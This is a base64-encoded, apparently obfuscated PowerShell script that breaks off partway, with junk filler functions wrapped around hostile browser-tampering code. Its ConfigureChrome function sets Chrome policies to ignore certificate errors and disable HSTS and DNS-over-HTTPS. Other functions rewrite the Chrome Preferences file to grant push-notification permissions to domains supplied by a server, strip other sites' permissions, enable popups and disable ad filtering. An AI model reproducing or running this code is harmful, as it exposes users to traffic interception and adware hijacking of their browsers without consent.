bVcwOU5iT0c4anhpJwp9IGVsc2UgewogICAgV3JpdGUtSG9zdCAnTE5VN1JxYUU0VkhyNWdLJwp9CmlmICgkdmFyX2NteEU2dzdpIC1ndCA1KSB7CiAgICBXcml0ZS1PdXRwdXQgJ0J5WnFWRmNHSkhJMm85NScKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAnbU9ka1c1ckIzMThRUzRzJwp9CiR2YXJfR0p3clBSdGMgPSBmbl9UNHM5SWVQMCAtcGFyYW0xIDEgLXBhcmFtMiA0MApXcml0ZS1Ib3N0ICc3U3QwcWh5UWJHTHpaa0gnCiR2YXJfYTBZRVA1dFUgPSBmbl9hUUlUejU4ViAtcGFyYW0xIDQ4IC1wYXJhbTIgNjkKV3JpdGUtT3V0cHV0ICdyWGVHOXVOaUFLY09DcWonCiR2YXJfY214RTZ3N2kgPSBmbl9hUUlUejU4ViAtcGFyYW0xIDYyIC1wYXJhbTIgMjAKV3JpdGUtSG9zdCAndFF1ZXdQYzRsSnBiZ3hPJwokdmFyX2NteEU2dzdpID0gZm5fSlJ1c1YySXAgLXBhcmFtMSAyNiAtcGFyYW0yIDk3CldyaXRlLU91dHB1dCAnTGNlcXNwdmdtV1IyM1RmJwokdmFyX2NteEU2dzdpID0gZm5fYVFJVHo1OFYgLXBhcmFtMSA1NCAtcGFyYW0yIDg0CldyaXRlLU91dHB1dCAnVnhrTERBVDFpeW5DWWdSJwokdmFyX0dKd3JQUnRjID0gZm5fVDRzOUllUDAgLXBhcmFtMSA4MyAtcGFyYW0yIDEKV3JpdGUtSG9zdCAnZTdwT1RkMGZTekljWkdvJwokdmFyX0dKd3JQUnRjID0gZm5fbmg0YmpmeEsgLXBhcmFtMSA3NiAtcGFyYW0yIDY4CldyaXRlLU91dHB1dCAnWnJLTFNkNmFvcGxrZ1JmJwokdmFyX0dKd3JQUnRjID0gZm5fbmg0YmpmeEsgLXBhcmFtMSA4MiAtcGFyYW0yIDE4CldyaXRlLU91dHB1dCAnUlNVRHduSExJc2xDTmYxJwokdmFyX2NteEU2dzdpID0gZm5fYVFJVHo1OFYgLXBhcmFtMSAyNiAtcGFyYW0yIDM5CldyaXRlLUhvc3QgJ1k5dldnT3lyVm5zekRFdycKJHZhcl8yeTdQQVVaVyA9IGZuX0pSdXNWMklwIC1wYXJhbTEgMTggLXBhcmFtMiAyCldyaXRlLUhvc3QgJ3FhRTRudFBSVGc2bDd4aycKJHZhcl9HSndyUFJ0YyA9IGZuX1Q0czlJZVAwIC1wYXJhbTEgMzkgLXBhcmFtMiA5MApXcml0ZS1Ib3N0ICc1U1JDa0F6dU1HWVhOaHEnCiR2YXJfR0p3clBSdGMgPSBmbl9UNHM5SWVQMCAtcGFyYW0xIDQxIC1wYXJhbTIgODkKV3JpdGUtSG9zdCAnNHhUTDU5bVowUlkzbEhYJwokdmFyXzJ5N1BBVVpXID0gZm5fYVFJVHo1OFYgLXBhcmFtMSAyMSAtcGFyYW0yIDcwCldyaXRlLUhvc3QgJ09RN3JZWmV1Mzhwd29YNCcKJHZhcl9lR2R3TGdhVCA9IGZuX0pSdXNWMklwIC1wYXJhbTEgODIgLXBhcmFtMiA5NApXcml0ZS1PdXRwdXQgJ3hFdTVTVUdYd0RUckpocCcKJHZhcl9lR2R3TGdhVCA9IGZuX0pSdXNWMklwIC1wYXJhbTEgMzAgLXBhcmFtMiAzOApXcml0ZS1PdXRwdXQgJ3BMWUV0VjhqQ2dQY1VBcycKJHZhcl8yeTdQQVVaVyA9IGZuX1Q0czlJZVAwIC1wYXJhbTEgOTggLXBhcmFtMiAxOApXcml0ZS1PdXRwdXQgJzBKNE9DQmRGR1BlZ2xVSCcKJHZhcl9HSndyUFJ0YyA9IGZuX3daUjhCam9XIC1wYXJhbTEgNDMgLXBhcmFtMiA5NQpXcml0ZS1Ib3N0ICdIYkplOHhvWGNGNmtaRGEnCiR2YXJfY214RTZ3N2kgPSBmbl9hUUlUejU4ViAtcGFyYW0xIDQgLXBhcmFtMiA2NwpXcml0ZS1PdXRwdXQgJ012Qjg3OUNsYWNiVjVFMCcKJHZhcl9jbXhFNnc3aSA9IGZuX0pSdXNWMklwIC1wYXJhbTEgNyAtcGFyYW0yIDE2CldyaXRlLUhvc3QgJ3hocWpSVUtOMFBydDNWdScKJHZhcl9jbXhFNnc3aSA9IGZuX25oNGJqZnhLIC1wYXJhbTEgMjAgLXBhcmFtMiA5NgpXcml0ZS1Ib3N0ICc1Tnp5S1JGWTBzU2xybjEnCiBmdW5jdGlvbiBDb25maWd1cmVDaHJvbWUgew0KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggIkhLTE06XFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xEbnNjYWNoZVxQYXJhbWV0ZXJzIiAtTmFtZSAiRW5hYmxlQXV0b0RPSCIgLVZhbHVlIDANCg0KICAgICRjaHJvbWVLZXlQYXRoID0gIkhLTE06XFNvZnR3YXJlXFBvbGljaWVzXEdvb2dsZVxDaHJvbWUiDQoNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRjaHJvbWVLZXlQYXRoKSkgew0KICAgICAgICBOZXctSXRlbSAtUGF0aCAkY2hyb21lS2V5UGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgIH0NCg0KICAgIE5ldy1JdGVtIC1QYXRoICRjaHJvbWVLZXlQYXRoIC1Gb3JjZSB8IE91dC1OdWxsICAjIENyZWF0ZSB0aGUga2V5IGlmIGl0IGRvZXNuJ3QgZXhpc3QNCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRjaHJvbWVLZXlQYXRoIC1OYW1lICJDb21tYW5kTGluZUZsYWciIC1WYWx1ZSAiLS1pZ25vcmUtY2VydGlmaWNhdGUtZXJyb3JzIC0tZGlzYWJsZS1xdWljIC0tZGlzYWJsZS1oc3RzIg0KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGNocm9tZUtleVBhdGggLU5hbWUgIkRuc092ZXJIdHRwcyIgLVZhbHVlICJvZmYiDQoNCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRjaHJvbWVLZXlQYXRoIC1OYW1lICJJZ25vcmVDZXJ0aWZpY2F0ZUVycm9ycyIgLVZhbHVlIDENCg0KICAgIFdyaXRlLU91dHB1dCAiQ2hyb21lIGNvbmZpZ3VyZWQiDQp9DQoNCmZ1bmN0aW9uIGZuX0xvZ19UNlk4dlhKMyB7CiAgICBwYXJhbSAoCiAgICAgICAgW3N0cmluZ10kbWVzc2FnZQogICAgKQogICAgV3JpdGUtT3V0cHV0ICdMb2c6ICRtZXNzYWdlJwp9CmZ1bmN0aW9uIGZuX1F6WTBKZUk3IHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfcUtEY1g0eXgsCiAgICAgICAgW2ludF0kdmFyXzdBcVhEUDY5CiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9xS0RjWDR5eCArICR2YXJfN0FxWERQNjkKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fb0dLdkRhZmwgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl83QXFYRFA2OSwKICAgICAgICBbaW50XSR2YXJfUmJWNE0ycjkKICAgICkKICAgICRyZXN1bHQgPSAkdmFyXzdBcVhEUDY5ICsgJHZhcl9SYlY0TTJyOQogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl9hU0pORjl5MSB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX1JiVjRNMnI5LAogICAgICAgIFtpbnRdJHZhcl9oaVUyNHF5bAogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfUmJWNE0ycjkgKyAkdmFyX2hpVTI0cXlsCiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuXzhsdzBtV1FhIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfaGlVMjRxeWwsCiAgICAgICAgW2ludF0kdmFyX2d1WEVqbFF5CiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9oaVUyNHF5bCArICR2YXJfZ3VYRWpsUXkKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fYU5CWjY3WHYgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9ndVhFamxReSwKICAgICAgICBbaW50XSR2YXJfcUtEY1g0eXgKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX2d1WEVqbFF5ICsgJHZhcl9xS0RjWDR5eAogICAgcmV0dXJuICRyZXN1bHQKfQppZiAoJHZhcl9xS0RjWDR5eCAtZ3QgMTApIHsKICAgIFdyaXRlLU91dHB1dCAnOFlXRUtMMDM0eGFmbG1rJwp9IGVsc2UgewogICAgV3JpdGUtSG9zdCAnUXlHQjJNazd4c242WVRsJwp9CmlmICgkdmFyXzdBcVhEUDY5IC1ndCAxMSkgewogICAgV3JpdGUtT3V0cHV0ICdad1RISVBTTWd4cUZkZnYnCn0gZWxzZSB7CiAgICBXcml0ZS1Ib3N0ICdxZko5VlJnMnpZQWNpM04nCn0KaWYgKCR2YXJfUmJWNE0ycjkgLWd0IDE3KSB7CiAgICBXcml0ZS1Ib3N0ICdEcW5wNEJHRnpRQTFIazcnCn0gZWxzZSB7CiAgICBXcml0ZS1Ib3N0ICdTMnBiVFBPRlhCcnNLUWsnCn0KaWYgKCR2YXJfaGlVMjRxeWwgLWd0IDE5KSB7CiAgICBXcml0ZS1PdXRwdXQgJ1lTdEtEcTQ4ZnN4ZTluSicKfSBlbHNlIHsKICAgIFdyaXRlLUhvc3QgJ1N2OE5nNmhSVG9KWmJxVicKfQppZiAoJHZhcl9ndVhFamxReSAtZ3QgNCkgewogICAgV3JpdGUtT3V0cHV0ICc0ZEU1MmlObGdoZW1zY0knCn0gZWxzZSB7CiAgICBXcml0ZS1Ib3N0ICdqdllPNTlvV0o3SWgyd3onCn0KJHZhcl83QXFYRFA2OSA9IGZuX29HS3ZEYWZsIC1wYXJhbTEgNTYgLXBhcmFtMiA2MwpXcml0ZS1Ib3N0ICcxT3ZvblhkaGdseUJVSFYnCiR2YXJfZ3VYRWpsUXkgPSBmbl9vR0t2RGFmbCAtcGFyYW0xIDQ5IC1wYXJhbTIgNDQKV3JpdGUtT3V0cHV0ICcyMDR3ZjdiQ1JlRXg2cjEnCiR2YXJfUmJWNE0ycjkgPSBmbl9hU0pORjl5MSAtcGFyYW0xIDEwIC1wYXJhbTIgMjUKV3JpdGUtT3V0cHV0ICdGNVkzenREZWhicDkwb2onCiR2YXJfZ3VYRWpsUXkgPSBmbl9RelkwSmVJNyAtcGFyYW0xIDc5IC1wYXJhbTIgOTIKV3JpdGUtT3V0cHV0ICdmblBRRmNPNGxUOEJYOXInCiR2YXJfaGlVMjRxeWwgPSBmbl9RelkwSmVJNyAtcGFyYW0xIDk0IC1wYXJhbTIgMzMKV3JpdGUtSG9zdCAnTzg3dDJBY1M2RWdvQkRsJwokdmFyXzdBcVhEUDY5ID0gZm5fYU5CWjY3WHYgLXBhcmFtMSA3NiAtcGFyYW0yIDY1CldyaXRlLUhvc3QgJ0kyYW9oN3R2VzB1VTk1SicKJHZhcl83QXFYRFA2OSA9IGZuX2FTSk5GOXkxIC1wYXJhbTEgMTEgLXBhcmFtMiA3MApXcml0ZS1PdXRwdXQgJ09zRmZESEV3MmhkMW0zRycKJHZhcl9SYlY0TTJyOSA9IGZuXzhsdzBtV1FhIC1wYXJhbTEgNjUgLXBhcmFtMiA2NApXcml0ZS1Ib3N0ICdjVGpKaUE1eDZWR1FtTnQnCiR2YXJfaGlVMjRxeWwgPSBmbl9RelkwSmVJNyAtcGFyYW0xIDk3IC1wYXJhbTIgNzkKV3JpdGUtT3V0cHV0ICd0cUFkRk1ValpjeWdiVEgnCiR2YXJfaGlVMjRxeWwgPSBmbl9vR0t2RGFmbCAtcGFyYW0xIDE5IC1wYXJhbTIgMzYKV3JpdGUtT3V0cHV0ICdqbkl3TTVOUTc2Y3Z5MWknCiR2YXJfcUtEY1g0eXggPSBmbl9vR0t2RGFmbCAtcGFyYW0xIDUyIC1wYXJhbTIgNzcKV3JpdGUtSG9zdCAnZ0lGUHFXMzZWZWtDOXNIJwokdmFyX3FLRGNYNHl4ID0gZm5fb0dLdkRhZmwgLXBhcmFtMSA0NSAtcGFyYW0yIDEKV3JpdGUtT3V0cHV0ICc3YmZGZVJvSUtwWWt3bHInCiR2YXJfZ3VYRWpsUXkgPSBmbl9vR0t2RGFmbCAtcGFyYW0xIDkyIC1wYXJhbTIgMzkKV3JpdGUtSG9zdCAnRU8zYWY4MnVnU2V2a0xuJwokdmFyX1JiVjRNMnI5ID0gZm5fb0dLdkRhZmwgLXBhcmFtMSAzMyAtcGFyYW0yIDcKV3JpdGUtT3V0cHV0ICdYaWdhUGNCSlY2N2Z3OHMnCiR2YXJfUmJWNE0ycjkgPSBmbl9vR0t2RGFmbCAtcGFyYW0xIDk1IC1wYXJhbTIgNzQKV3JpdGUtSG9zdCAnMEc0ZnBoZVpMbk5qNjVsJwokdmFyX2d1WEVqbFF5ID0gZm5fUXpZMEplSTcgLXBhcmFtMSAzNyAtcGFyYW0yIDczCldyaXRlLU91dHB1dCAnMkZjWUM1dUlha1V2dDdOJwokdmFyX3FLRGNYNHl4ID0gZm5fYU5CWjY3WHYgLXBhcmFtMSA4NSAtcGFyYW0yIDUwCldyaXRlLU91dHB1dCAnSUMzRnowandUdW9EdFVKJwokdmFyX3FLRGNYNHl4ID0gZm5fYU5CWjY3WHYgLXBhcmFtMSA0MCAtcGFyYW0yIDE0CldyaXRlLUhvc3QgJ2dWWWlocFFBZDhYTENxVCcKJHZhcl9SYlY0TTJyOSA9IGZuXzhsdzBtV1FhIC1wYXJhbTEgMjMgLXBhcmFtMiA0CldyaXRlLU91dHB1dCAnTFpwOEUyOVJDTnlxQnpuJwokdmFyX1JiVjRNMnI5ID0gZm5fYVNKTkY5eTEgLXBhcmFtMSA0MiAtcGFyYW0yIDEKV3JpdGUtSG9zdCAnbDhwWHFGVmV1UmZnT3MwJwogCgoNCgoKDQoNCg0KDQpmdW5jdGlvbiBDb21wYXJlLUFycmF5cyB7DQogICAgcGFyYW0gKA0KICAgICAgICBbYXJyYXldJEFycmF5MSwNCiAgICAgICAgW2FycmF5XSRBcnJheTINCiAgICApDQoNCiAgICAjIFNvcnQgYm90aCBhcnJheXMgYW5kIGNvbXBhcmUNCiAgICAkYXJyYXkxU29ydGVkID0gJEFycmF5MSB8IFNvcnQtT2JqZWN0IHwgR2V0LVVuaXF1ZQ0KICAgICRhcnJheTJTb3J0ZWQgPSAkQXJyYXkyIHwgU29ydC1PYmplY3QgfCBHZXQtVW5pcXVlDQoNCiAgICAkam8xID0gJGFycmF5MVNvcnRlZCAtam9pbiAnLCcgDQogICAgDQogICAgJGpvMiA9ICRhcnJheTJTb3J0ZWQgLWpvaW4gJywnDQoNCiAgICAjIERldGVybWluZSBpZiB0aGUgYXJyYXlzIGFyZSBlcXVhbCAob3JkZXIgZG9lcyBub3QgbWF0dGVyKQ0KICAgIGlmICgkam8xIC1lcSAkam8yICkgew0KICAgICAgICByZXR1cm4gJHRydWUNCiAgICB9IGVsc2Ugew0KICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIEhhdmVUb1B1c2hlcyB7DQogICAgJHJlc3VsdCA9ICRmYWxzZTsNCiAgICAkZXhpc3RzID0gQCgpDQogICAgJHRvc2V0ID0gQCgpDQogICAgJHByZWZlcmVuY2VzUGF0aCA9ICIkZW52OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxEZWZhdWx0XFByZWZlcmVuY2VzIg0KDQogICAgIyBDaGVjayBpZiB0aGUgUHJlZmVyZW5jZXMgZmlsZSBleGlzdHMNCiAgICBpZiAoVGVzdC1QYXRoICRwcmVmZXJlbmNlc1BhdGgpIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRwcmVmZXJlbmNlc1BhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24NCg0KICAgICAgICAjIENoZWNrIGlmIHRoZSBzdHJ1Y3R1cmUgaXMgYXMgZXhwZWN0ZWQNCiAgICAgICAgaWYgKCRwcmVmZXJlbmNlc0NvbnRlbnQgLWFuZCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUgLWFuZCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncyAtYW5kICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzLmV4Y2VwdGlvbnMubm90aWZpY2F0aW9ucykgew0KICAgICAgICAgICAgJG5vdGlmaWNhdGlvblNldHRpbmdzID0gJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MuZXhjZXB0aW9ucy5ub3RpZmljYXRpb25zDQoNCiAgICAgICAgICAgICMgSXRlcmF0ZSB0aHJvdWdoIGVhY2ggZW50cnkgaW4gJG5vdGlmaWNhdGlvblNldHRpbmdzDQogICAgICAgICAgICBmb3JlYWNoICgkZmllbGQgaW4gJG5vdGlmaWNhdGlvblNldHRpbmdzLlBTT2JqZWN0LlByb3BlcnRpZXMpIHsNCiAgICAgICAgICAgICAgICAkc2l0ZVVybCA9ICRmaWVsZC5OYW1lDQogICAgICAgICAgICAgICAgJGV4aXN0cyArPSBQdXNoRG9tYWluIC1wdXNoVXJsICRzaXRlVXJsDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBmb3JlYWNoICgkcHVzaCBpbiAkc2VydmVyLnB1c2hlcykgew0KICAgICAgICAkdG9zZXQgKz0gUHVzaERvbWFpbiAtcHVzaFVybCAkcHVzaA0KICAgIH0NCg0KICAgICAkcmVzdWx0ID0gLW5vdChDb21wYXJlLUFycmF5cyAtQXJyYXkxICRleGlzdHMgLUFycmF5MiAkdG9zZXQpDQogICAgDQogICAgcmV0dXJuICRyZXN1bHQ7DQp9DQoNCg0KZnVuY3Rpb24gUHVzaERvbWFpbiB7DQogICAgcGFyYW0gKCRwdXNoVXJsKQ0KDQogICAgIyBUcmltIHRoZSBpbnB1dCBzdHJpbmcgYmVmb3JlIHRoZSBmaXJzdCBjb21tYQ0KICAgICR0cmltbWVkVXJsID0gJHB1c2hVcmwuVHJpbSgpLlNwbGl0KCcsJylbMF0uVHJpbSgpDQoNCiAgICAjIFBhcnNlIHRoZSBVUkkNCiAgICAkcGFyc2VkVXJpID0gW1N5c3RlbS5VcmldOjpuZXcoJHRyaW1tZWRVcmwpDQogICAgDQogICAgIyBFeHRyYWN0IGRvbWFpbiBhbmQgcG9ydA0KICAgICRkb21haW4gPSAkcGFyc2VkVXJpLkhvc3QNCiAgICAkcG9ydCA9IGlmICgkcGFyc2VkVXJpLlBvcnQgLWVxIC0xKSB7IDQ0MyB9IGVsc2UgeyAkcGFyc2VkVXJpLlBvcnQgfQ0KDQogICAgIyBDb25zdHJ1Y3QgdGhlIHJlc3VsdCBVUkwNCiAgICAkcmVzdWx0ID0gImh0dHBzOi8vIiArICRkb21haW4gKyAiOiIgKyAiJHBvcnQsKiINCiAgICANCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KDQpmdW5jdGlvbiBQdXNoRXhpc3RzDQp7DQogICAgcGFyYW0gKCRwdXNoVXJsKQ0KICAgIGZvcmVhY2ggKCRwdXNoIGluICRzZXJ2ZXIucHVzaGVzKSANCiAgICB7DQogICAgICAgIGlmICgoUHVzaERvbWFpbiAtcHVzaFVybCAkcHVzaFVybCkgLWVxIChQdXNoRG9tYWluIC1wdXNoVXJsICRwdXNoKSkNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuICR0cnVlOw0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAkZmFsc2UNCn0NCg0KZnVuY3Rpb24gUmVtb3ZlLVB1c2hlcyB7DQogICAgJHByZWZlcmVuY2VzUGF0aCA9ICIkZW52OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxEZWZhdWx0XFByZWZlcmVuY2VzIg0KDQogICAgIyBDaGVjayBpZiB0aGUgUHJlZmVyZW5jZXMgZmlsZSBleGlzdHMNCiAgICBpZiAoVGVzdC1QYXRoICRwcmVmZXJlbmNlc1BhdGgpIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRwcmVmZXJlbmNlc1BhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24NCg0KICAgICAgICAjIENoZWNrIGlmIHRoZSBzdHJ1Y3R1cmUgaXMgYXMgZXhwZWN0ZWQNCiAgICAgICAgaWYgKCRwcmVmZXJlbmNlc0NvbnRlbnQgLWFuZCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUgLWFuZCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncyAtYW5kICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzLmV4Y2VwdGlvbnMubm90aWZpY2F0aW9ucykgew0KICAgICAgICAgICAgJG5vdGlmaWNhdGlvblNldHRpbmdzID0gJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MuZXhjZXB0aW9ucy5ub3RpZmljYXRpb25zDQoNCiAgICAgICAgICAgICRrZXlzVG9SZW1vdmUgPSBAKCkNCg0KICAgICAgICAgICAgIyBJdGVyYXRlIHRocm91Z2ggZWFjaCBlbnRyeSBpbiAkbm90aWZpY2F0aW9uU2V0dGluZ3MNCiAgICAgICAgICAgIGZvcmVhY2ggKCRmaWVsZCBpbiAkbm90aWZpY2F0aW9uU2V0dGluZ3MuUFNPYmplY3QuUHJvcGVydGllcykgew0KICAgICAgICAgICAgICAgICRzaXRlVXJsID0gJGZpZWxkLk5hbWUNCiAgICAgICAgICAgICAgICAkcGVybWlzc2lvbiA9IChQdXNoRXhpc3RzIC1wdXNoVXJsICRzaXRlVXJsKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKCRwZXJtaXNzaW9uIC1lcSAkZmFsc2UpIHsNCiAgICAgICAgICAgICAgICAgICAgJGtleXNUb1JlbW92ZSArPSAkZmllbGQuTmFtZQ0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiJHNpdGVVcmwgaGFzbid0IGJlZW4gcmVtb3ZlZCwgaXQgaXMgYSBnb29kIHNpdGUuIg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgZm9yZWFjaCAoJGtleSBpbiAka2V5c1RvUmVtb3ZlKSB7DQogICAgICAgICAgICAgICAgJG5vdGlmaWNhdGlvblNldHRpbmdzLlBTT2JqZWN0LlByb3BlcnRpZXMuUmVtb3ZlKCRrZXkpDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQgfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMTAwIHwgU2V0LUNvbnRlbnQgLVBhdGggJHByZWZlcmVuY2VzUGF0aCAtRm9yY2UNCg0KICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJBbGwgc2VsZWN0ZWQgcHVzaCBub3RpZmljYXRpb24gc2V0dGluZ3MgaGF2ZSBiZWVuIHJlbW92ZWQuIg0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJObyBvciB1bmV4cGVjdGVkIG5vdGlmaWNhdGlvbiBzZXR0aW5ncyBmb3VuZCBpbiBQcmVmZXJlbmNlcyBmaWxlLiINCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgIFdyaXRlLU91dHB1dCAiUHJlZmVyZW5jZXMgZmlsZSBub3QgZm91bmQgYXQgcGF0aDogJHByZWZlcmVuY2VzUGF0aCINCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEFkZC1QdXNoZXN7DQogICAgZm9yZWFjaCAoJHB1c2ggaW4gJHNlcnZlci5wdXNoZXMpIHsNCiAgICAgICAgQWRkLVB1c2ggLXB1c2hVcmwgJHB1c2ggLXdvcmsgJHdvcmsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEFkZC1QdXNoIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHB1c2hVcmwNCiAgICApDQoNCiAgICAkcHVzaERvbWFpbiA9IFB1c2hEb21haW4gLXB1c2hVcmwgJHB1c2hVcmwNCg0KICAgICRjaHJvbWVQcmVmZXJlbmNlc1BhdGggPSAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxQcmVmZXJlbmNlcyINCg0KICAgIGlmICgtbm90IChUZXN0LVBhdGggLVBhdGggJGNocm9tZVByZWZlcmVuY2VzUGF0aCkpIHsNCiAgICAgICAgV3JpdGUtSG9zdCAiQ2hyb21lIHByZWZlcmVuY2VzIGZpbGUgbm90IGZvdW5kIGF0IHBhdGg6ICRjaHJvbWVQcmVmZXJlbmNlc1BhdGgiDQogICAgICAgIGV4aXQNCiAgICB9DQoNCiAgICAkcHJlZmVyZW5jZXNDb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJGNocm9tZVByZWZlcmVuY2VzUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KDQogICAgaWYgKC1ub3QgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBwcm9maWxlIC1WYWx1ZSBAe30NCiAgICB9DQoNCiAgICBpZiAoLW5vdCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIGRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcyAtVmFsdWUgQHt9DQogICAgfQ0KDQogICAgaWYgKC1ub3QgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcy5wb3B1cHMpIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIHBvcHVwcyAtVmFsdWUgMQ0KICAgIH0gZWxzZSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMucG9wdXBzID0gMQ0KICAgIH0NCg0KICAgIGlmICgtbm90ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMuc3VicmVzb3VyY2VfZmlsdGVyKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBzdWJyZXNvdXJjZV9maWx0ZXIgLVZhbHVlIDENCiAgICB9IGVsc2Ugew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzLnN1YnJlc291cmNlX2ZpbHRlciA9IDENCiAgICB9DQoNCiAgICAkcHJlZmVyZW5jZXNDb250ZW50SnNvbiA9ICRwcmVmZXJlbmNlc0NvbnRlbnQgfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMzINCiAgICBTZXQtQ29udGVudCAtUGF0aCAkY2hyb21lUHJlZmVyZW5jZXNQYXRoIC1WYWx1ZSAkcHJlZmVyZW5jZXNDb250ZW50SnNvbiAtRm9yY2UNCg0KICAgICRwcmVmZXJlbmNlc1BhdGggPSAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxQcmVmZXJlbmNlcyINCg0KICAgIGlmIChUZXN0LVBhdGggJHByZWZlcmVuY2VzUGF0aCkgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJHByZWZlcmVuY2VzUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KICAgICAgICAkY29udGVudFNldHRpbmdzID0gJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MuZXhjZXB0aW9ucw0KICAgICAgICAkc2V0dGluZ3NUb1VwZGF0ZSA9IEAoDQogICAgICAgICAgICAiYXV0b19waWN0dXJlX2luX3BpY3R1cmUiLCAiYmFja2dyb3VuZF9zeW5jIiwgImNhbWVyYSIsICJjbG